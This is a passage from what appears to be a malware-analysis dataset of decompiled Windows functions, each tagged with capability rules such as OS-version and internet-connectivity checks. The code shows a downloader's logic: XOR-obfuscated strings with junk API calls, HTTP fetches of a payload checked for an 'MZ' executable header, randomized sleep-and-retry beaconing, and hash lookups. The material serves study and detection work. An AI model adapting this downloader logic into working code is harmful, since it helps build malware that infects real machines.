&var_50h - puVar3;\n    do {\n        iVar6 = (*_sym.imp.KERNEL32.dll_IsSystemResumeAutomatic)();\n        if (iVar6 != 0x62fe3f) {\n            *(iVar4 + puVar3) = *(&var_ch + iVar4 % var_44h) ^ (iVar4 + puVar3)[&var_50h - puVar3];\n        }\n        iVar4 = iVar4 + 1;\n    } while (iVar4 < 8);\n    iVar6 = (*_sym.imp.WINHTTP.dll_WinHttpOpenRequest)\n                      (lpMultiByteStr, puVar3, lpdwNumberOfBytesAvailable, 0, 0, 0, 0x800140);\n    hRequest = iVar6;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, lpdwNumberOfBytesAvailable);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n    iVar4 = var_110h;\n    if (iVar6 == 0) {\ncode_r0x00403b78:\n        arg_8h = 1;\n    }\n    else {\n        var_114h = 0x3300;\n        var_118h = 8;\n        iVar2 = fcn.00405bae();\n        if (iVar2 != 0) {\n            var_4ch = 0;\n            var_50h = &var_424h;\n            lpBuffer = 3;\n            (*_sym.imp.WINHTTP.dll_WinHttpSetOption)(iVar6, 0x26, &lpBuffer, 0xc);\n        }\n        (*_sym.imp.WINHTTP.dll_WinHttpSetOption)(iVar6, 0x1f, &var_114h, 4);\n        (*_sym.imp.WINHTTP.dll_WinHttpSetOption)(iVar6, 0x3f, &var_118h, 4);\n        if (lpdwNumberOfBytesRead != 0) {\n            var_38h = 0x4c395935;\n            var_34h = 0x583e6721;\n            var_30h = 0x595d4f29;\n            var_2ch = 0x672d4c78;\n            var_28h = 0x4f385820;\n            var_24h = 0x4c2b5902;\n            var_20h = 0x587c6772;\n            var_1ch = 0x594a4f28;\n            var_18h._0_2_ = 0x4c58;\n            var_ch = 0x4c585967;\n            var_8h._0_1_ = 0x4f;\n            uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x45);\n            iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n            iVar6 = 0;\n            lpdwNumberOfBytesAvailable = &var_38h - iVar4;\n            do {\n                iVar2 = (*_sym.imp.USER32.dll_GetCapture)();\n                if (iVar2 != 0x969c7c) {\n                    *(iVar6 + iVar4) = *(&var_ch + iVar6 % var_44h) ^ *((&var_38h - iVar4) + iVar6 + iVar4);\n                }\n                iVar6 = iVar6 + 1;\n            } while (iVar6 < 0x22);\n            (*_sym.imp.USER32.dll_wsprintfW)(&lpszHeaders, iVar4, lpdwNumberOfBytesRead);\n            uVar1 = (*_sym.imp.KERNEL32.dll_lstrlenW)(&lpszHeaders, 0x10000000);\n            iVar6 = hRequest;\n            (*_sym.imp.WINHTTP.dll_WinHttpAddRequestHeaders)(hRequest, &lpszHeaders, uVar1);\n            uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar4);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n            iVar4 = var_110h;\n            puVar3 = var_40h;\n        }\n        iVar2 = (*_sym.imp.WINHTTP.dll_WinHttpSendRequest)(iVar6, 0, 0xffffffff, 0, 0, 0, 0);\n        if ((iVar2 == 0) || (iVar2 = (*_sym.imp.WINHTTP.dll_WinHttpReceiveResponse)(iVar6, 0),  iVar2 == 0))\n        goto code_r0x00403b78;\n        lpdwBufferLength = 4;\n        var_100h = 0;\n        var_fch = 0;\n        (*_sym.imp.WINHTTP.dll_WinHttpQueryHeaders)(iVar6, 0x20000005, 0, &var_100h, &lpdwBufferLength, 0);\n        if (*arg_10h == 0) {\n            *arg_10h = var_100h;\n        }\n        lpdwBufferLength = 4;\n        (*_sym.imp.WINHTTP.dll_WinHttpQueryHeaders)(iVar6, 0x20000013, 0, &var_fch, &lpdwBufferLength, 0);\n        if ((var_fch == 0xce) || (var_fch == 200)) {\n            if (var_48h[1] == 0) {\n                uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, var_100h);\n                iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n                *var_48h = 0;\n                var_48h[1] = iVar2;\n            }\n            hRequest = var_48h[1];\n            lpdwNumberOfBytesRead = 0;\n            do {\n                lpdwNumberOfBytesAvailable = NULL;\n                iVar2 = (*_sym.imp.WINHTTP.dll_WinHttpQueryDataAvailable)(iVar6, &lpdwNumberOfBytesAvailable);\n                if ((iVar2 == 0) ||\n                   (iVar2 = (*_sym.imp.WINHTTP.dll_WinHttpReadData)\n                                      (iVar6, *var_48h + hRequest, lpdwNumberOfBytesAvailable, &lpdwNumberOfBytesRead), \n                   iVar2 == 0)) {\n                    arg_8h = 4;\n                    goto code_r0x00403b7f;\n                }\n                *var_48h = *var_48h + lpdwNumberOfBytesRead;\n                iVar2 = *var_48h;\n            } while (lpdwNumberOfBytesAvailable != NULL);\n            *arg_14h = iVar2;\n            if ((*arg_10h == 0) || (iVar2 == *arg_10h)) {\n                arg_8h = 0;\n            }\n        }\n        else {\n            arg_8h = 3;\n        }\n    }\ncode_r0x00403b7f:\n    if (iVar6 != 0) {\n        (*_sym.imp.WINHTTP.dll_WinHttpCloseHandle)(iVar6);\n    }\n    pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, puVar3);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\ncode_r0x00403b9c:\n    uVar1 = (*pcVar5)(0, iVar4);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n    if (lpMultiByteStr != 0) {\n        (*_sym.imp.WINHTTP.dll_WinHttpCloseHandle)(lpMultiByteStr);\n    }\n    return arg_8h;\n}\n",
        "token_count": 4539
    },
    "null": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid entry0(void)\n\n{\n    uint32_t uVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    code *pcVar5;\n    code *pcVar6;\n    code *pcVar7;\n    int32_t iVar8;\n    code *pcVar9;\n    uchar *puVar10;\n    int32_t var_80h;\n    int32_t var_7ch;\n    int32_t lpLibFileName;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_63h;\n    uint var_5fh;\n    uint var_5bh;\n    uint var_57h;\n    uint32_t var_53h;\n    uint var_4fh;\n    uint var_4bh;\n    uint var_47h;\n    uint var_43h;\n    uchar var_3fh;\n    uchar var_3eh;\n    uchar var_3dh;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uchar uStack44;\n    uchar var_27h;\n    code *pszFirst;\n    uchar *var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    pcVar5 = _sym.imp.KERNEL32.dll_SetErrorMode;\n    var_80h = 0;\n    uVar1 = (*_sym.imp.KERNEL32.dll_SetErrorMode)(0);\n    (*pcVar5)(uVar1 | 2);\n    var_18h = 0x780b2916;\n    var_14h = 0x60537600;\n    var_10h = 0x61292050;\n    var_8h = 0x344e6145;\n    var_4h._0_2_ = CONCAT11(var_4h._1_1_, 0x4c);\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xd);\n    iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    var_20h = 0x5;\n    iVar8 = 0;\n    lpLibFileName = iVar3;\n    do {\n        iVar4 = (*_sym.imp.USER32.dll_CloseClipboard)();\n        if (iVar4 != 0xec74dc) {\n            *(iVar8 + iVar3) = *(&var_8h + iVar8 % var_20h) ^ (iVar8 + iVar3)[&var_18h - iVar3];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 0xc);\n    var_1ch = 0x70a3b3a;\n    var_18h = 0x181d1a2e;\n    var_14h = 0x202a040e;\n    var_10h = 0xd151516;\n    var_ch._0_2_ = 0x2339;\n    var_ch._2_1_ = 0x79;\n    var_8h = 0x6a675479;\n    var_4h._0_2_ = 0x744f;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x14);\n    iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    var_20h = 0x6;\n    iVar8 = 0;\n    pszFirst = &var_1ch - iVar3;\n    do {\n        iVar4 = (*_sym.imp.USER32.dll_GetDialogBaseUnits)();\n        if (iVar4 != 0xa4f64a) {\n            *(iVar8 + iVar3) = *(&var_8h + iVar8 % var_20h) ^ (iVar8 + iVar3)[&var_1ch - iVar3];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 0x13);\n    uVar2 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(lpLibFileName, iVar3);\n    pcVar5 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar2);\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetCommandLineW)();\n    var_8h = (*pcVar5)(uVar2, &var_80h);\n    pcVar7 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x208);\n    pcVar5 = _sym.imp.KERNEL32.dll_HeapAlloc;\n    pcVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    pcVar9 = pcVar6;\n    for (iVar3 = 0x208; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *pcVar9 = 0x0;\n        pcVar9 = pcVar9 + 1;\n    }\n    pszFirst = pcVar6;\n    (*_sym.imp.KERNEL32.dll_GetModuleFileNameW)(0, pcVar6, 0x104);\n    var_3ch._0_1_ = 0x2a;\n    var_3ch._1_2_ = 0x2645;\n    var_3ch._3_1_ = 0x41;\n    var_38h._0_1_ = 0x2d;\n    var_38h._1_2_ = 0x3435;\n    var_38h._3_1_ = 0x45;\n    var_34h._0_1_ = 0x36;\n    var_34h._1_2_ = 0x7741;\n    var_34h._3_1_ = 0x35;\n    var_30h._0_1_ = 0x22;\n    var_30h._1_2_ = 0x2d45;\n    var_30h._3_1_ = 0x41;\n    var_2ch._0_1_ = 0x3c;\n    var_2ch._1_2_ = 0x4735;\n    var_2ch._3_1_ = 0x45;\n    var_10h = 0x41554547;\n    var_ch._0_2_ = 0x3559;\n    *0x41dd68 = pcVar6;\n    uVar2 = (*pcVar7)(8, 0x29);\n    iVar3 = (*pcVar5)(uVar2);\n    iVar8 = 0;\n    var_7ch = iVar3;\n    lpLibFileName = &var_3ch - iVar3;\n    do {\n        iVar4 = (*_sym.imp.USER32.dll_GetKBCodePage)();\n        pcVar5 = pszFirst;\n        if (iVar4 != 0x717cb4) {\n            *(iVar8 + iVar3) = *(&var_10h + iVar8 % var_20h) ^ (iVar8 + iVar3)[&var_3ch - iVar3];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 0x14);\n    iVar3 = (*_sym.imp.SHLWAPI.dll_StrStrIW)(pszFirst, iVar3);\n    pcVar7 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (iVar3 != 0) goto code_r0x00403f3e;\n    fcn.00401a02(pcVar5);\n    uVar2 = 0;\n    (*_sym.imp.KERNEL32.dll_GetModuleHandleW)();\n    fcn.0040a16f(uVar2);\n    do {\n        while( true ) {\n            (*_sym.imp.KERNEL32.dll_ExitProcess)(0);\ncode_r0x00403f3e:\n            if (1 < var_80h) {\n                *0x41dd68 = *(var_8h + 4);\n            }\n            *0x41dd7c = fcn.00403cfe();\n            fcn.0040606d();\n            (*_sym.imp.KERNEL32.dll_GetCurrentProcess)();\n            iVar3 = fcn.0040b687();\n            (*_sym.imp.KERNEL32.dll_GetVersion)();\n            if (iVar3 != 1) break;\n            fcn.0040f59b();\n            uVar2 = (*pcVar7)(0, pcVar5);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n        }\n        var_74h = 0x43134a74;\n        var_70h = 0x4a01372a;\n        var_6ch = 0x373b4316;\n        var_68h._0_1_ = 5;\n        stack0xffffff95 = 0x5f43134a;\n        var_63h = 0x1f4a0d37;\n        var_5fh = 0x32371343;\n        var_5bh = 0x1543204a;\n        var_57h = 0x3d4a2237;\n        var_53h = 0x25371c43;\n        var_4fh = 0x33430e4a;\n        var_4bh = 0x264a3f37;\n        var_47h = 0x23371f43;\n        var_43h = 0x1f433c4a;\n        var_3fh = 0x37;\n        var_3eh = 0x25;\n        var_3dh = 0x4a;\n        var_3ch._0_1_ = 0x72;\n        var_3ch._1_2_ = 0x3f43;\n        var_3ch._3_1_ = 0x37;\n        var_38h._0_1_ = 0x29;\n        var_38h._1_2_ = 0x224a;\n        var_38h._3_1_ = 0x43;\n        var_34h._0_1_ = 0x16;\n        var_34h._1_2_ = 0x3e37;\n        var_34h._3_1_ = 0x4a;\n        var_30h._0_1_ = 0x20;\n        var_30h._1_2_ = 0x1f43;\n        var_30h._3_1_ = 0x37;\n        var_2ch._0_1_ = 0x23;\n        var_2ch._1_2_ = 0xe4a;\n        var_2ch._3_1_ = 0x43;\n        uStack44 = 0x7a;\n        var_27h = 0x37;\n        var_10h = 0x43524a51;\n        var_ch._0_2_ = 0x377a;\n        uVar2 = (*pcVar7)(8, 0x9d);\n        iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n        iVar8 = 0;\n        var_7ch = iVar3;\n        var_8h = &var_74h - iVar3;\n        do {\n            iVar4 = (*_sym.imp.USER32.dll_GetActiveWindow)();\n            if (iVar4 != 0x4ec927) {\n                *(iVar8 + iVar3) = *(&var_10h + iVar8 % var_20h) ^ (iVar8 + iVar3)[&var_74h - iVar3];\n            }\n            pcVar7 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n            iVar8 = iVar8 + 1;\n        } while (iVar8 < 0x4e);\n        var_53h = var_53h & 0xffffff | 0x4f000000;\n        var_4fh = 0x3d711972;\n        var_4bh = 0x3e72196b;\n        var_47h = 0x76b2171;\n        var_43h = 0x2b711872;\n        var_3fh = 0x6b;\n        var_3eh = 5;\n        var_3dh = 0x72;\n        var_3ch._0_1_ = 0x3e;\n        var_3ch._1_2_ = 0x6171;\n        var_3ch._3_1_ = 0x6b;\n        var_38h._0_1_ = 0x36;\n        var_38h._1_2_ = 0x1e72;\n        var_38h._3_1_ = 0x71;\n        var_34h._0_1_ = 0x25;\n        var_34h._1_2_ = 0x196b;\n        var_34h._3_1_ = 0x72;\n        var_30h._0_1_ = 0x21;\n        var_30h._1_2_ = 0x3771;\n        var_30h._3_1_ = 0x6b;\n        var_2ch._0_1_ = 0x36;\n        var_2ch._1_2_ = 0x4a72;\n        var_2ch._3_1_ = 0x71;\n        var_10h = 0x714a726a;\n        var_ch._0_2_ = 0x6b44;\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x51);\n        iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n        iVar8 = 0;\n        var_8h = &var_53h + (3 - iVar3);\n        do {\n            iVar4 = (*pcVar7)();\n            if (iVar4 != 0x7b236c) {\n                *(iVar8 + iVar3) = *(&var_10h + iVar8 % var_20h) ^ (iVar8 + iVar3)[var_8h];\n            }\n            iVar8 = iVar8 + 1;\n        } while (iVar8 < 0x28);\n        uVar2 = (*pcVar7)(8, 0x208);\n        pcVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n        pszFirst = pcVar5;\n        uVar2 = (*pcVar7)(8, 0x208);\n        var_20h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n        for (iVar8 = 0x208; iVar8 != 0; iVar8 = iVar8 + -1) {\n            *pcVar5 = 0x0;\n            pcVar5 = pcVar5 + 1;\n        }\n        puVar10 = var_20h;\n        for (iVar8 = 0x208; pcVar5 = _sym.imp.KERNEL32.dll_ExpandEnvironmentStringsW,  iVar8 != 0; iVar8 = iVar8 + -1) {\n            *puVar10 = 0;\n            puVar10 = puVar10 + 1;\n        }\n        (*_sym.imp.KERNEL32.dll_ExpandEnvironmentStringsW)(var_7ch, pszFirst, 0x104);\n        (*pcVar5)(iVar3, var_20h, 0x104);\n        iVar3 = fcn.00401ebc();\n        if (iVar3 == 0) {\n            iVar3 = fcn.00405914();\n            if (iVar3 == 0) {\n                iVar3 = fcn.00405ac0();\n                if (iVar3 == 0) goto code_r0x00404191;\n            }\n        }\n        else {\ncode_r0x00404191:\n            pcVar9 = pszFirst;\n            pcVar5 = _sym.imp.SHLWAPI.dll_StrStrIW;\n            iVar3 = (*_sym.imp.SHLWAPI.dll_StrStrIW)(*0x41dd68, pszFirst);\n            if (iVar3 != 0) {\ncode_r0x004041bd:\n                fcn.00403c0e();\n                uVar2 = (*_sym.imp.KERNEL32.dll_CreateThread)(0, 0, fcn.004027b3, 0, 0, 0);\n                (*_sym.imp.KERNEL32.dll_CloseHandle)(uVar2);\n                uVar2 = (*pcVar7)(0, pcVar9);\n                pcVar5 = _sym.imp.KERNEL32.dll_HeapFree;\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n                uVar2 = (*pcVar7)(0, var_20h);\n                (*pcVar5)(uVar2);\n                do {\n                    (*_sym.imp.KERNEL32.dll_Sleep)(0xffffffff);\n                } while( true );\n            }\n            iVar3 = (*pcVar5)(*0x41dd68, var_20h);\n            if (iVar3 != 0) goto code_r0x004041bd;\n            fcn.0040ec49();\n        }\n        fcn.0040cd11();\n    } while( true );\n}\n",
        "token_count": 3852
    },
    "004042dc": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nbool fcn.004042dc(void)\n\n{\n    bool bVar1;\n    code *pcVar2;\n    char cVar3;\n    uint uVar4;\n    char *pcVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    char *pcVar8;\n    int32_t iVar9;\n    uint *puVar10;\n    uint lpWSAData;\n    uint ARG_0;\n    uint32_t var_70h;\n    uint32_t var_6ch;\n    int32_t var_68h;\n    int32_t var_64h;\n    int32_t *var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint32_t var_24h;\n    char *var_20h;\n    uint var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    char *var_10h;\n    uint var_ch;\n    uint var_8h;\n    char *var_4h;\n    \n    pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    var_70h = *0x41dab0;\n    var_5ch = 0x3d570c19;\n    var_58h._0_2_ = 0x817;\n    var_58h._2_1_ = 0x1f;\n    var_68h = 6;\n    var_58h._3_1_ = 6;\n    var_54h = 0x219335d;\n    var_50h = 0x295b0015;\n    var_4ch = 0x1a0b1c03;\n    var_48h = 0x16052f41;\n    var_44h = 0x741a1401;\n    var_40h = 0x5d4a5f2d;\n    var_3ch = 0x59446c00;\n    var_38h = 0x59045740;\n    var_ch = 0x59346e78;\n    var_8h._0_2_ = 0x6e72;\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x29);\n    pcVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n    iVar9 = 0;\n    var_14h = &var_5ch - pcVar5;\n    var_10h = pcVar5;\n    do {\n        iVar6 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        if (iVar6 != 0x29afbf) {\n            pcVar5[iVar9] = *(&var_ch + iVar9 % var_68h) ^ (pcVar5 + iVar9)[var_14h];\n        }\n        iVar9 = iVar9 + 1;\n    } while (iVar9 < 0x28);\n    (*_sym.imp.WS2_32.dll_WSAStartup)(0x201, &lpWSAData);\n    var_14h = 0;\n    var_4h = str.DG_X;\n    do {\n        var_ch = 0;\n        var_6ch = 0;\n        iVar9 = 0;\n        var_64h = 1;\n        do {\n            if (var_4h[var_14h] != '\\0') {\n                cVar3 = *pcVar5;\n                pcVar8 = pcVar5;\n                while (cVar3 != var_4h[var_14h]) {\n                    if (cVar3 == '\\0') {\n                        bVar1 = false;\n                        goto code_r0x004043f1;\n                    }\n                    pcVar8 = pcVar8 + 1;\n                    cVar3 = *pcVar8;\n                }\n            }\n            iVar9 = iVar9 + 1;\n        } while (iVar9 < 0x20);\n        bVar1 = true;\ncode_r0x004043f1:\n        if (((*var_4h != '\\0') && (var_4h[0x1f] == '\\0')) && (bVar1)) {\n            var_34h = 0x2d01461f;\n            var_30h = 0x4759452a;\n            puVar10 = &ARG_0;\n            for (iVar9 = 0x40; iVar9 != 0; iVar9 = iVar9 + -1) {\n                *puVar10 = 0;\n                puVar10 = puVar10 + 1;\n            }\n            var_2ch = 0x13777c05;\n            puVar10 = &var_24h;\n            for (iVar9 = 8; iVar9 != 0; iVar9 = iVar9 + -1) {\n                *puVar10 = 0;\n                puVar10 = puVar10 + 1;\n            }\n            var_28h._0_2_ = 0x3454;\n            var_1ch = 0x48713430;\n            var_18h._0_2_ = 0x3658;\n            uVar4 = (*pcVar2)(8, 0xf);\n            iVar9 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n            iVar6 = 0;\n            var_64h = &var_34h - iVar9;\n            do {\n                iVar7 = (*_sym.imp.USER32.dll_GetDesktopWindow)();\n                if (iVar7 != 0x8a0fe1) {\n                    *(iVar6 + iVar9) = *(&var_1ch + iVar6 % var_68h) ^ (iVar6 + iVar9)[var_64h];\n                }\n                iVar6 = iVar6 + 1;\n            } while (iVar6 < 0xe);\n            (*_sym.imp.USER32.dll_wsprintfA)(&ARG_0, iVar9, 0x855e829);\n            iVar6 = fcn.00403bc2(0, &ARG_0, &var_6ch, &var_ch);\n            if (iVar6 == 0) {\n                if (var_6ch == 0) {\n                    fcn.0040f56a();\n                    uVar4 = (*pcVar2)(0, iVar9);\n                    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n                    break;\n                }\n                if (var_24h < var_6ch) {\n                    fcn.0040f56a();\n                    var_70h = var_70h * 0x19660d + 0x3c6ef35f;\n                    (*_sym.imp.KERNEL32.dll_Sleep)(var_70h % 600000 + 60000);\n                }\n                else if (((4 < var_6ch) && (var_6ch == var_24h)) &&\n                        ((var_20h != NULL && ((*var_20h == 'M' && (var_20h[1] == 'Z')))))) {\n                    fcn.0040f31f();\n                    fcn.0040f56a();\n                    uVar4 = (*pcVar2)(0, iVar9);\n                    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n                    break;\n                }\n            }\n            uVar4 = (*pcVar2)(0, iVar9);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n            pcVar5 = var_10h;\n        }\n        var_4h = var_4h + 0x20;\n        var_14h = var_14h + 1;\n    } while (var_4h < 0x41da50);\n    iVar9 = *var_60h;\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_10h);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n    return iVar9 != 0;\n}\n",
        "token_count": 1828
    },
    "004045e7": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0040466b)\n// WARNING: Removing unreachable block (ram,0x0040467b)\n// WARNING: Removing unreachable block (ram,0x00404688)\n// WARNING: Removing unreachable block (ram,0x00404693)\n// WARNING: Removing unreachable block (ram,0x004046a2)\n// WARNING: Removing unreachable block (ram,0x004046ac)\n// WARNING: Removing unreachable block (ram,0x004046ae)\n// WARNING: Removing unreachable block (ram,0x004046b4)\n// WARNING: Removing unreachable block (ram,0x004046ca)\n\nuint __cdecl fcn.004045e7(uint arg_8h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uchar *puVar4;\n    \n    uVar3 = *0x41dab0;\n    puVar4 = 0x41db14;\n    for (iVar2 = 8; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar4 = 0;\n        puVar4 = puVar4 + 1;\n    }\n    fcn.004041fd();\n    pcVar1 = _sym.imp.KERNEL32.dll_Sleep;\n    (*_sym.imp.KERNEL32.dll_Sleep)(600000);\n    while (*0x41ddd8 == 0) {\n        if (*0x41db10 == 0) {\n            iVar2 = 0x32;\n        }\n        else {\n            *0x41db10 = 0x855e829;\n            iVar2 = fcn.004042dc();\n            if (iVar2 != 0) {\n                fcn.0040f56a();\n            }\n            uVar3 = uVar3 * 0x19660d + 0x3c6ef35f;\n            iVar2 = uVar3 % 600000 + 60000;\n        }\n        (*pcVar1)(iVar2);\n    }\n    return 0;\n}\n",
        "token_count": 447
    },
    "004058aa": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint fcn.004058aa(void)\n\n{\n    uint32_t uVar1;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_24h = 0xaea3ed09;\n    uVar1 = 0;\n    var_20h = 0x2993125a;\n    var_1ch = 0x3d75a3ff;\n    var_18h = 0x662d9d39;\n    var_14h = 0x922df04;\n    var_10h = 0xc84f40f0;\n    var_ch = 0xdcfc6e80;\n    do {\n        var_8h = (&var_24h)[uVar1];\n        var_4h = 0;\n        fcn.0040472d();\n        if (var_4h == 0) {\n            return 0;\n        }\n        uVar1 = uVar1 + 1;\n    } while (uVar1 < 7);\n    return 1;\n}\n",
        "token_count": 275
    },
    "00405914": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint fcn.00405914(void)\n\n{\n    int32_t iVar1;\n    uint var_c0h;\n    uint var_bch;\n    uint var_b8h;\n    uint var_b4h;\n    uint var_b0h;\n    uint var_ach;\n    uint var_a8h;\n    uint var_a4h;\n    uint var_a0h;\n    uint var_9ch;\n    uint var_98h;\n    uint var_94h;\n    uint var_90h;\n    uint var_8ch;\n    uint var_88h;\n    uint var_84h;\n    uint var_80h;\n    uint var_7ch;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_ch = 0;\n    var_8h = 0x278cdf58;\n    iVar1 = 0;\n    var_bch = 0x2d386ece;\n    var_b8h = 0xaba416e3;\n    var_b4h = 0xbffde1f0;\n    var_b0h = 0x6fadb57b;\n    var_ach = 0x581419ac;\n    var_a8h = 0xa93a5da5;\n    var_a4h = 0x9fe09b81;\n    var_a0h = 0x62b621c4;\n    var_9ch = 0xe2f42d3;\n    var_98h = 0x1cb3f267;\n    var_94h = 0x7deed7db;\n    var_90h = 0x487c3558;\n    var_8ch = 0xbc541011;\n    var_88h = 0x70f400cf;\n    var_84h = 0x7e11e4cf;\n    var_80h = 0x52feb192;\n    var_7ch = 0x1e24d477;\n    var_78h = 0x4a6b6ebc;\n    var_74h = 0x6de558e4;\n    var_70h = 0x6e4851f8;\n    var_6ch = 0x9f5462ed;\n    var_68h = 0x896773d7;\n    var_64h = 0x68b0f30d;\n    var_60h = 0x7b8b2670;\n    var_5ch = 0x1e84d9c6;\n    var_58h = 0xf9b64044;\n    var_54h = 0x11e91917;\n    var_50h = 0x7ec953ab;\n    var_4ch = 0xafb3480;\n    var_48h = 0x5d5421cf;\n    var_44h = 0x4055c0a5;\n    var_40h = 0xb4c2ed27;\n    var_3ch = 0x6751a7a7;\n    var_38h = 0xf0fc4f7;\n    var_34h = 0xbf550eed;\n    var_30h = 0x1b54824;\n    var_2ch = 0x72c7bd89;\n    var_28h = 0xb15afa72;\n    var_24h = 0xd35c5e5c;\n    var_20h = 0x86bd8b3a;\n    var_1ch = 0x334b7fa5;\n    var_18h = 0x47e5605f;\n    var_14h = 0xe1e54873;\n    var_10h = 0xd8367b99;\n    do {\n        var_4h = 0;\n        fcn.0040472d();\n        if (var_4h != 0) {\n            return 1;\n        }\n        var_8h = (&var_bch)[iVar1];\n        iVar1 = iVar1 + 1;\n    } while (var_8h != 0);\n    return 0;\n}\n",
        "token_count": 1109
    },
    "00405bae": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
